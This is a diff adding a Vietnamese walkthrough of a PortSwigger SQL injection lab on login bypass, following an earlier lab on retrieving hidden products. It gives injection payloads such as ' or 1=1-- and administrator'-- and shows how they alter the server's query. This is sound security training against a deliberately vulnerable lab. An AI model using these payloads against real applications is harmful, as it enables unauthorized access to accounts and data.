@@ -27,3 +27,31 @@ SELECT * FROM products WHERE category = '' or 1=1--' AND released = 1
 Bởi vì `1=1` luôn đúng nên câu truy vấn sẽ trả về tất cả các sản phẩm bao gồm cả những sản phẩm chưa release:
 
 ![image](images/lab-1/lab-1-1.png)
+
+### Lab 2: [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
+
+> This lab contains a SQL injection vulnerability in the login function.
+>
+> To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
+
+Bên dưới là giao diện tại trang đăng nhập:
+
+![image](images/lab-2/lab-2.png)
+
+Bài lab yêu cầu chúng ta đăng nhập với user là `administrator` nhưng chúng ta không biết password.
+
+Chúng ta có thể dự đoán server sẽ thực hiện câu truy vấn:
+
+```sql
+SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
+```
+
+Vậy chúng ta sẽ nhập username là `administrator'--` và password bất kì để câu truy vấn trở thành:
+
+```sql
+SELECT * FROM users WHERE username = 'administrator'--' AND password = '<password>'
+```
+
+Từ đó, chúng ta đăng nhập thành công:
+
+![image](images/lab-2/lab-2-1.png)
